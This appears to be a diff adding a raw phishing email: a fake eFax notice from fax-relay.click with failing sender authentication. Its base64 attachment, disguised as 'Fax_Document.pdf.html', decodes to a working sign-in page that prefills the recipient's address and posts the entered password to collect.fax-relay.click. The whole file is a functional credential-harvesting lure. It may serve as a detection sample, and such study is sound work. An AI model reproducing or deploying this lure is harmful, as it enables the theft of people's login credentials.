@@ -1,0 +1,28 @@
+Delivered-To: alex.morgan@example.org
+Received: by 2002:a05:7300:1234 with SMTP id q1csp1; Mon, 19 Oct 2026 16:00:06 -0700 (PDT)
+Received: from mail.fax-relay.click (mail.fax-relay.click [192.0.2.60])
+        by mx.google.com with ESMTPS id x1si2
+        for <alex.morgan@example.org>; Mon, 19 Oct 2026 16:00:05 +0000
+Authentication-Results: mx.google.com;
+       dkim=none;
+       spf=softfail smtp.mailfrom=fax-relay.click;
+       dmarc=none header.from=fax-relay.click
+From: "eFax Notification" <fax@fax-relay.click>
+To: alex.morgan@example.org
+Subject: You have received a new fax (2 pages)
+Date: Mon, 19 Oct 2026 16:00:00 +0000
+Message-ID: <h1@fax-relay.click>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="B2"
+
+--B2
+Content-Type: text/plain; charset=utf-8
+
+Open the attached document to view your fax.
+--B2
+Content-Type: text/html; name="Fax_Document.pdf.html"
+Content-Disposition: attachment; filename="Fax_Document.pdf.html"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHk+PGgzPlNpZ24gaW4gdG8gdmlldzwvaDM+PGZvcm0gYWN0aW9uPSJodHRwczovL2NvbGxlY3QuZmF4LXJlbGF5LmNsaWNrL3AucGhwIiBtZXRob2Q9InBvc3QiPjxpbnB1dCBuYW1lPSJlbWFpbCIgdmFsdWU9ImFsZXgubW9yZ2FuQGV4YW1wbGUub3JnIj48aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InB3Ij48YnV0dG9uPlNpZ24gaW48L2J1dHRvbj48L2Zvcm0+PHNjcmlwdD52YXIgeD1hdG9iKCJhR1ZzYkc4PSIpOzwvc2NyaXB0PjwvYm9keT48L2h0bWw+
+--B2--
